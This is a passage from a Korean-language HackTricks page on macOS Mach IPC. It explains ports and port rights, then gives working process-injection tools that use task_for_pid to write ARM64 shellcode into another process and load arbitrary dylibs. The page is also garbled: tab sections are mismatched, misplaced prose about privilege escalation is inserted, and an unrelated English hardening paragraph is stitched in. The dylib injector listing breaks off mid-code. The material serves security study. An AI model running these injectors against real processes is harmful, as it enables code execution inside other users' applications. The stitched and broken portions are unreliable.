# macOS IPC - 프로세스 간 통신

{% hint style="success" %}
AWS 해킹 배우고 실습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우고 실습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 요금제**](https://github.com/sponsors/carlospolop) 확인하기!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 가입하거나 [**텔레그램 그룹**](https://t.me/peass) 참여 또는 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 팔로우하기**.
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 저장소에 PR을 제출하여 해킹 요령 공유하기.

</details>
{% endhint %}

## 포트를 통한 Mach 메시징

### 기본 정보

Mach는 **작업**을 **리소스 공유의 가장 작은 단위**로 사용하며, 각 작업에는 **여러 스레드**가 포함될 수 있습니다. 이러한 **작업과 스레드는 1:1로 POSIX 프로세스와 스레드에 매핑**됩니다.

작업 간 통신은 Mach Inter-Process Communication (IPC)을 통해 이루어지며, 일방향 통신 채널을 활용합니다. **메시지는 포트 간에 전송**되며, 이는 커널에 의해 관리되는 **메시지 큐처럼 작동하는 포트**입니다.

각 프로세스에는 **IPC 테이블**이 있어 **프로세스의 mach 포트**를 찾을 수 있습니다. Mach 포트의 이름은 사실상 숫자(커널 객체를 가리키는 포인터)입니다.

프로세스는 또한 **다른 작업에게 일부 권한을 가진 포트 이름을 보낼 수 있으며**, 커널은 이를 **다른 작업의 IPC 테이블에 등록**합니다.

### 포트 권한

작업이 수행할 수 있는 작업을 정의하는 포트 권한은 이 통신에 중요합니다. 가능한 **포트 권한**은 ([여기에서 정의됨](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **수신 권한**은 포트로 전송된 메시지를 수신할 수 있게 합니다. Mach 포트는 MPSC (다중 생산자, 단일 소비자) 큐이므로 전체 시스템에서 각 포트에 대해 **하나의 수신 권한만 있을 수 있습니다** (여러 프로세스가 하나의 파이프의 읽기 끝에 대한 파일 기술자를 모두 보유할 수 있는 파이프와는 달리).
* **수신 권한을 가진 작업**은 메시지를 수신하고 **송신 권한을 생성**할 수 있으며, 원래로는 **자체 작업이 자신의 포트에 대한 수신 권한**을 가지고 있습니다.
* **송신 권한**은 포트로 메시지를 보낼 수 있게 합니다.
* 송신 권한은 복제될 수 있어 송신 권한을 소유한 작업이 권한을 복제하고 **세 번째 작업에게 부여**할 수 있습니다.
* **한 번 송신 권한**은 포트로 한 번의 메시지를 보낼 수 있게 합니다.
* **포트 세트 권한**은 단일 포트가 아닌 _포트 세트_를 나타냅니다. 포트 세트에서 메시지를 디큐하는 것은 해당 포트 중 하나에서 메시지를 디큐합니다. 포트 세트는 Unix의 `select`/`poll`/`epoll`/`kqueue`와 매우 유사하게 여러 포트에서 동시에 수신할 수 있습니다.
* **데드 네임**은 실제 포트 권한이 아니라 단순히 자리 표시자입니다. 포트가 파괴되면 포트에 대한 모든 기존 포트 권한이 데드 네임으로 변합니다.

**작업은 다른 작업에게 송신 권한을 전달**하여 메시지를 다시 보낼 수 있습니다. **송신 권한은 복제될 수 있어 작업이 권한을 복제하고 세 번째 작업에게 권한을 부여**할 수 있습니다. 이는 **부트스트랩 서버**라는 중간 프로세스와 결합되어 작업 간 효과적인 통신을 가능하게 합니다.

### 파일 포트

파일 포트는 Mac 포트(맥 포트 권한을 사용)에 파일 기술자를 캡슐화할 수 있습니다. 주어진 FD를 사용하여 `fileport_makeport`를 사용하여 `fileport`를 만들고, `fileport_makefd`를 사용하여 fileport에서 FD를 만들 수 있습니다.

### 통신 설정

#### 단계:

통신 채널을 설정하려면 **부트스트랩 서버**(mac의 **launchd**)가 관여합니다.

1. 작업 **A**는 **새 포트**를 초기화하여 프로세스에서 **수신 권한**을 획득합니다.
2. **수신 권한**을 보유한 작업 **A**는 포트에 대한 **송신 권한을 생성**합니다.
3. 작업 **A**는 **부트스트랩 서버**와 **포트의 서비스 이름** 및 **송신 권한**을 제공하여 부트스트랩 등록이라는 절차를 통해 **연결**을 설정합니다.
4. 작업 **B**는 **부트스트랩 서버**와 상호 작용하여 서비스 이름에 대한 부트스트랩 **조회를 실행**합니다. 성공하면 **서버는 작업 A로부터 받은 송신 권한을 복제**하고 **작업 B로 전송**합니다.
5. 송신 권한을 획득한 작업 **B**는 **메시지를 작성**하고 **작업 A로 전송**할 수 있습니다.
6. 양방향 통신을 위해 일반적으로 작업 **B**는 **수신 권한**과 **송신 권한을 가진 새 포트를 생성**하고 **송신 권한을 작업 A에게 제공**하여 작업 B에게 메시지를 보낼 수 있게 합니다(양방향 통신).

부트스트랩 서버는 작업이 주장한 서비스 이름을 인증할 수 없습니다. 이는 **작업**이 잠재적으로 **시스템 작업을 가장할 수 있음**을 의미합니다. 예를 들어, 권한 서비스 이름을 가장하여 모든 요청을 승인할 수 있습니다.

그런 다음, Apple은 **시스템 제공 서비스의 이름**을 안전한 구성 파일에 저장합니다. 이 파일은 SIP로 보호된 디렉토리인 `/System/Library/LaunchDaemons` 및 `/System/Library/LaunchAgents`에 있습니다. 각 서비스 이름 옆에는 **관련된 이진 파일도 저장**됩니다. 부트스트랩 서버는 이러한 서비스 이름 각각에 대한 **수신 권한을 생성**하고 보유합니다.

이러한 사전 정의된 서비스에 대해서는 **조회 프로세스가 약간 다릅니다**. 서비스 이름을 조회할 때, launchd는 작업이 실행 중인지 확인하고 실행 중이 아니면 **시작**합니다. 그 후의 새로운 작업 흐름은 다음과 같습니다:

* 작업 **B**는 서비스 이름에 대한 부트스트랩 **조회**를 시작합니다.
* **launchd**는 작업이 실행 중인지 확인하고 실행 중이 아니면 **시작**합니다.
* 작업 **A**(서비스)는 **부트스트랩 체크인**을 수행합니다. 여기서 **부트스트랩** 서버는 송신 권한을 생성하고 보유하며 **수신 권한을 작업 A로 전송**합니다.
* launchd는 **송신 권한을 복제하고 작업 B로 전송**합니다.
* 작업 **B**는 **수신 권한**과 **송신 권한**을 가진 새 포트를 생성하고 **송신 권한을 작업 A**(svc)에게 제공하여 작업 B에게 메시지를 보낼 수 있게 합니다(양방향 통신).

그러나 이 프로세스는 사전 정의된 시스템 작업에만 적용됩니다. 비시스템 작업은 여전히 처음에 설명한 대로 작동하며, 가장할 수 있는 가능성이 있습니다. 

### Mach 메시지

[더 많은 정보는 여기에서 찾을 수 있습니다](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 함수는 사실상 시스템 호출로, Mach 메시지를 보내고 받는 데 사용됩니다. 이 함수는 보내려는 메시지를 초기 인수로 필요로 합니다. 이 메시지는 `mach_msg_header_t` 구조로 시작해야 하며, 실제 메시지 내용이 뒤따라야 합니다. 이 구조는 다음과 같이 정의됩니다:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
프로세스가 _**수신 권한**_을 가지고 있으면 Mach 포트에서 메시지를 수신할 수 있습니다. 반대로 **보내는 쪽**은 _**보내기**_ 또는 _**한 번 보내기 권한**_을 부여받습니다. 한 번 보내기 권한은 한 번의 메시지를 보낸 후에는 무효화됩니다.

쉬운 **양방향 통신**을 위해 프로세스는 mach **메시지 헤더**에서 _응답 포트_ (**`msgh_local_port`**)라고 불리는 mach 포트를 지정할 수 있습니다. 메시지의 **수신자**는 이 메시지에 대한 응답을 보낼 수 있습니다. **`msgh_bits`**의 비트 플래그는 이 포트에 대해 **한 번 보내기 권한**이 파생되고 전송되어야 함을 나타내는 데 사용될 수 있습니다 (`MACH_MSG_TYPE_MAKE_SEND_ONCE`).

{% hint style="success" %}
XPC 메시지에서 사용되는 이러한 종류의 양방향 통신은 응답을 기대하는 메시지에 사용됩니다 (`xpc_connection_send_message_with_reply` 및 `xpc_connection_send_message_with_reply_sync`). 그러나 **일반적으로 서로 다른 포트가 생성**되어 양방향 통신을 생성하는 방법은 이전에 설명한 대로입니다.
{% endhint %}

메시지 헤더의 다른 필드는 다음과 같습니다:

- `msgh_size`: 전체 패킷의 크기.
- `msgh_remote_port`: 이 메시지가 전송된 포트.
- `msgh_voucher_port`: [mach 바우처](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: 수신자가 해석하는 이 메시지의 ID.

{% hint style="danger" %}
**mach 메시지는 \_mach 포트**를 통해 전송됩니다. 이는 mach 커널에 내장된 **단일 수신자**, **다중 송신자** 통신 채널입니다. **여러 프로세스**가 mach 포트로 메시지를 **보낼 수 있지만**, 언제든지 **단일 프로세스만** 읽을 수 있습니다.
{% endhint %}

### 포트 나열하기
```bash
lsmp -p <pid>
```
### 코드 예시

**sender**가 포트를 할당하고 `org.darlinghq.example` 이름에 대한 **send right**를 생성하여 **부트스트랩 서버**로 보내는 방법을 주목하십시오. 수신자는 해당 이름에 대한 **send right**를 요청하고 이를 사용하여 **메시지를 보내는** 방법을 사용했습니다.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}sender.c 파일에는 수신자 프로세스에 메시지를 보내는 코드가 포함되어 있습니다. 이 코드는 Mach IPC를 사용하여 프로세스 간 통신을 구현합니다. sender.c 파일은 수신자 프로세스와 통신하여 특정 작업을 수행하도록 명령을 보냅니다. 이를 통해 권한 상승 공격 등의 공격 기법을 사용할 수 있습니다.{% endtab %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### 특권 포트

* **호스트 포트**: 프로세스가 이 포트에 대한 **Send** 권한을 가지면 **시스템에 대한 정보**를 얻을 수 있습니다 (예: `host_processor_info`).
* **호스트 특권 포트**: 이 포트에 대한 **Send** 권한을 가진 프로세스는 커널 익스텐션을 로드하는 등 **특권 작업**을 수행할 수 있습니다. 이 권한을 얻으려면 **프로세스가 루트여야** 합니다.
* 또한 **`kext_request`** API를 호출하려면 다른 엔타이틀먼트 **`com.apple.private.kext*`**가 필요하며, 이는 Apple 이진 파일에만 부여됩니다.
* **태스크 이름 포트**: _태스크 포트_의 권한이 없는 버전입니다. 태스크를 참조하지만 제어할 수는 없습니다. 이를 통해 사용할 수 있는 것은 `task_info()`뿐입니다.
* **태스크 포트** (또는 커널 포트)**:** 이 포트에 대한 Send 권한이 있으면 태스크를 제어할 수 있습니다 (메모리 읽기/쓰기, 스레드 생성 등).
* 호출 `mach_task_self()`를 사용하여 호출자 태스크에 대한 이 포트의 **이름을 가져옵니다**. 이 포트는 **`exec()`**를 통해만 **상속**됩니다. `fork()`로 생성된 새로운 태스크는 새로운 태스크 포트를 받습니다 (`exec()` 후에 suid 이진 파일에서도 특별한 경우로 새로운 태스크 포트를 받습니다). 태스크를 생성하고 해당 포트를 가져오는 유일한 방법은 `fork()`를 수행하는 동안 ["포트 스왑 댄스"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)를 수행하는 것입니다.
* 이 포트에 액세스하기 위한 제한 사항은 (`AppleMobileFileIntegrity` 바이너리의 `macos_task_policy`에서):
* 앱이 **`com.apple.security.get-task-allow` 엔타이틀먼트**를 가지고 있으면 **동일한 사용자의 프로세스가 태스크 포트에 액세스**할 수 있습니다 (주로 디버깅을 위해 Xcode에서 추가됨). **노타리제이션** 프로세스는 프로덕션 릴리스에서 이를 허용하지 않습니다.
* **`com.apple.system-task-ports`** 엔타이틀먼트가 있는 앱은 커널을 제외한 **모든** 프로세스의 **태스크 포트를 얻을 수** 있습니다. 이전 버전에서는 **`task_for_pid-allow`**로 불렸습니다. 이 권한은 Apple 애플리케이션에만 부여됩니다.
* **루트는** **하드닝된** 런타임으로 컴파일되지 않은 애플리케이션의 태스크 포트에 **액세스할 수** 있습니다 (Apple에서 제공되지 않은 경우). 

### 태스크 포트를 통한 스렬코드 삽입

다음에서 셸코드를 가져올 수 있습니다:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 

### entitlements.plist

IPC mechanisms are used by macOS applications to communicate with each other. By manipulating inter-process communication (IPC), an attacker can potentially escalate privileges or perform other malicious actions. To prevent this, it is important to properly configure entitlements.plist files for macOS applications to restrict their capabilities and interactions with other processes.

The entitlements.plist file contains a list of entitlements that define the privileges and resources an application is allowed to access. By carefully reviewing and configuring these entitlements, you can limit the attack surface and reduce the risk of privilege escalation through IPC vulnerabilities.

When hardening macOS systems, make sure to review and update the entitlements.plist files for all applications to follow the principle of least privilege and minimize the potential impact of IPC-based attacks.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

이전 프로그램을 **컴파일**하고 동일한 사용자로 코드를 주입할 수 있도록 **엔터티먼트**를 추가하십시오 (그렇지 않으면 **sudo**를 사용해야 합니다).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### Task port를 통한 스레드 내 Dylib Injection

macOS에서 **스레드**는 **Mach**를 통해 조작되거나 **posix `pthread` api**를 사용하여 조작될 수 있습니다. 이전 인젝션에서 생성된 스레드는 Mach api를 사용하여 생성되었기 때문에 **posix 호환성이 없습니다**.

**간단한 쉘코드를 인젝트**하여 명령을 실행하는 것이 가능했던 이유는 **posix 호환성이 필요하지 않았기 때문**이며, Mach와만 작동해도 충분했습니다. **더 복잡한 인젝션**을 하려면 **스레드**가 **posix 호환성**을 갖추어야 합니다.

따라서 **스레드를 개선**하기 위해 **`pthread_create_from_mach_thread`**를 호출하여 **유효한 pthread를 생성**해야 합니다. 그런 다음, 이 새로운 pthread는 **시스템에서 dylib를 로드**하기 위해 **dlopen을 호출**할 수 있으므로 다른 작업을 수행하기 위해 새로운 쉘코드를 작성하는 대신 사용자 정의 라이브러리를 로드할 수 있습니다.

예를 들어 **다음과 같은 예제 dylibs**를 찾을 수 있습니다 (예: 로그를 생성하고 해당 로그를 청취할 수 있는 것):

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

